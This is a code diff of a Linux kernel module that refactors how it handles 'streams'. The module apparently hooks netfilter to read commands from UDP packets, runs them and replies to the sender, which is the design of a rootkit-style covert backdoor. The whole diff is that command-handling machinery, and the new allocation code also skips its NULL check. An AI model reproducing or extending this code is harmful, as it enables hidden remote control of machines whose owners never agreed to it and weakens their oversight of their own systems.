@@ -144,19 +144,34 @@ int send_response(
 struct MRK_command_work {
     struct work_struct work;
     struct cmd_type *cmd;
-    const char *arg;
+    char *arg;
     size_t arg_len;
     struct origin origin;
 };
 
-int is_open_stream(short job_id) {
+struct open_stream *get_open_stream(job_id_t job_id) {
     struct open_stream *stream;
     hash_for_each_possible(open_streams, stream, node, job_id) {
         if (stream->origin.job_id == job_id) {
-            return 1;
+            return stream;
         }
     }
-    return 0;
+    return NULL;
+}
+
+struct open_stream *create_stream(struct origin origin, struct stream_type type) {
+    struct open_stream *stream;
+    stream = kmalloc(sizeof(struct open_stream), GFP_KERNEL);
+    stream->origin = origin;
+    stream->type = type;
+    hash_add(open_streams, &stream->node, origin.job_id);
+    return stream;
+}
+
+void close_stream(struct open_stream *stream) {
+    stream->type.close(stream);
+    hash_del(&stream->node);
+    kfree(stream);
 }
 
 static void handle_command(struct work_struct *work) {
@@ -164,24 +179,20 @@ static void handle_command(struct work_struct *work) {
     struct open_stream *stream;
     struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
     if (command_work->cmd->func == NULL) {
-        hash_for_each_possible(open_streams, stream, node, command_work->origin.job_id) {
-            if (stream->origin.job_id == command_work->origin.job_id) {
-                stream->type.recv(stream, command_work->arg, command_work->arg_len);
-                goto done;
-            }
+        stream = get_open_stream(command_work->origin.job_id);
+        if (stream) {
+            stream->type.recv(stream, command_work->arg, command_work->arg_len);
+        } else {
+            stream = create_stream(command_work->origin, command_work->cmd->stream);
+            printk(KERN_INFO "Found (stream) %s cmd packet! will open\n", command_work->cmd->name);
+            result[0] = 0;
+            send_response(
+                command_work->origin,
+                result,
+                sizeof(result)
+            );
+            stream->type.open(stream);
         }
-        stream = kmalloc(sizeof(struct open_stream), GFP_KERNEL);
-        stream->origin = command_work->origin;
-        stream->type = command_work->cmd->stream;
-        hash_add(open_streams, &stream->node, command_work->origin.job_id);
-        printk(KERN_INFO "Found (stream) %s cmd packet! will open\n", command_work->cmd->name);
-        result[0] = 0;
-        send_response(
-            command_work->origin,
-            result,
-            sizeof(result)
-        );
-        stream->type.open(stream);
     } else {
         result[0] = command_work->cmd->func(command_work->arg);
         printk(KERN_INFO "Found %s cmd packet! executed with code %s\n", command_work->cmd->name, result);
@@ -192,7 +203,6 @@ static void handle_command(struct work_struct *work) {
         );
     }
     
-done:
     // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
     // It is permissible to free the struct work_struct from inside the function that is called from it.
     kfree(command_work->arg);
@@ -263,7 +273,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     user_data_len = get_udp_user_data(skb, &user_data);
 
     printk(KERN_INFO "job id - %d\n", get_unaligned((job_id_t *)user_data));
-    if (is_open_stream(get_unaligned((job_id_t *)user_data))) {
+    if (get_open_stream(get_unaligned((job_id_t *)user_data))) {
         job_id = get_unaligned((job_id_t *)user_data);
         user_data += sizeof(job_id_t);
         user_data_len -= sizeof(job_id_t);
